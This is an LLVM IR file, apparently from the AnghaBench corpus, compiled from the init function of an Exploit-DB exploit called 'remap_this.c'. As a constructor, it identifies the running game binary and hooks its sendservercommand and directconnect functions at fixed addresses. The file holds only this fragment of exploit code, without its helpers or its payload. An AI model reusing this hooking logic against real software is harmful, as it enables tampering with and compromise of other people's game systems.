; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1750.c_init.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1750.c_init.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i32, i64, i64, i32 }

@.str = private unnamed_addr constant [53 x i8] c"remap_this.c by landser - landser at hotmail.co.il\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"/proc/self/exe\00", align 1
@.str.2 = private unnamed_addr constant [11 x i8] c"readlink()\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@c = common dso_local global i64 0, align 8
@ngames = common dso_local global i64 0, align 8
@games = common dso_local global %struct.TYPE_2__* null, align 8
@.str.3 = private unnamed_addr constant [41 x i8] c"binary doesnt match any of the targets.\0A\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"game: %s.\0A\0A\00", align 1
@sendservercommand = common dso_local global i32 0, align 4
@_sendservercommand = common dso_local global i8* null, align 8
@directconnect = common dso_local global i32 0, align 4
@_directconnect = common dso_local global i8* null, align 8
@llvm.global_ctors = appending global [1 x { i32, void ()*, i8* }] [{ i32, void ()*, i8* } { i32 65535, void ()* @init, i8* null }]

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @init() #0 {
  %1 = alloca [256 x i8], align 16
  %2 = alloca i32, align 4
  %3 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0))
  %4 = getelementptr inbounds [256 x i8], [256 x i8]* %1, i64 0, i64 0
  %5 = call i32 @readlink(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i8* %4, i32 256)
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp slt i32 %6, 0
  br i1 %7, label %8, label %12

8:                                                ; preds = %0
  %9 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  %10 = load i32, i32* @EXIT_FAILURE, align 4
  %11 = call i32 @exit(i32 %10) #3
  unreachable

12:                                               ; preds = %0
  %13 = load i32, i32* %2, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds [256 x i8], [256 x i8]* %1, i64 0, i64 %14
  store i8 0, i8* %15, align 1
  store i64 0, i64* @c, align 8
  br label %16

16:                                               ; preds = %31, %12
  %17 = load i64, i64* @c, align 8
  %18 = load i64, i64* @ngames, align 8
  %19 = icmp ult i64 %17, %18
  br i1 %19, label %20, label %34

20:                                               ; preds = %16
  %21 = getelementptr inbounds [256 x i8], [256 x i8]* %1, i64 0, i64 0
  %22 = load %struct.TYPE_2__*, %struct.TYPE_2__** @games, align 8
  %23 = load i64, i64* @c, align 8
  %24 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %22, i64 %23
  %25 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %24, i32 0, i32 4
  %26 = load i32, i32* %25, align 8
  %27 = call i64 @strstr(i8* %21, i32 %26)
  %28 = icmp ne i64 %27, 0
  br i1 %28, label %29, label %30

29:                                               ; preds = %20
  br label %34

30:                                               ; preds = %20
  br label %31

31:                                               ; preds = %30
  %32 = load i64, i64* @c, align 8
  %33 = add i64 %32, 1
  store i64 %33, i64* @c, align 8
  br label %16

34:                                               ; preds = %29, %16
  %35 = load i64, i64* @c, align 8
  %36 = load i64, i64* @ngames, align 8
  %37 = icmp eq i64 %35, %36
  br i1 %37, label %38, label %42

38:                                               ; preds = %34
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.3, i64 0, i64 0))
  %40 = load i32, i32* @EXIT_FAILURE, align 4
  %41 = call i32 @exit(i32 %40) #3
  unreachable

42:                                               ; preds = %34
  %43 = load %struct.TYPE_2__*, %struct.TYPE_2__** @games, align 8
  %44 = load i64, i64* @c, align 8
  %45 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %43, i64 %44
  %46 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %45, i32 0, i32 0
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0), i8* %47)
  %49 = call i32 (...) @writebuf()
  %50 = load %struct.TYPE_2__*, %struct.TYPE_2__** @games, align 8
  %51 = load i64, i64* @c, align 8
  %52 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %50, i64 %51
  %53 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %52, i32 0, i32 3
  %54 = load i64, i64* %53, align 8
  %55 = inttoptr i64 %54 to i8*
  %56 = load %struct.TYPE_2__*, %struct.TYPE_2__** @games, align 8
  %57 = load i64, i64* @c, align 8
  %58 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %56, i64 %57
  %59 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %58, i32 0, i32 1
  %60 = load i32, i32* %59, align 8
  %61 = call i8* @hook(i8* %55, i32 %60, i32* @sendservercommand)
  store i8* %61, i8** @_sendservercommand, align 8
  %62 = load %struct.TYPE_2__*, %struct.TYPE_2__** @games, align 8
  %63 = load i64, i64* @c, align 8
  %64 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %62, i64 %63
  %65 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %64, i32 0, i32 2
  %66 = load i64, i64* %65, align 8
  %67 = inttoptr i64 %66 to i8*
  %68 = load %struct.TYPE_2__*, %struct.TYPE_2__** @games, align 8
  %69 = load i64, i64* @c, align 8
  %70 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %68, i64 %69
  %71 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %70, i32 0, i32 1
  %72 = load i32, i32* %71, align 8
  %73 = call i8* @hook(i8* %67, i32 %72, i32* @directconnect)
  store i8* %73, i8** @_directconnect, align 8
  ret void
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @readlink(i8*, i8*, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @strstr(i8*, i32) #1

declare dso_local i32 @writebuf(...) #1

declare dso_local i8* @hook(i8*, i32, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
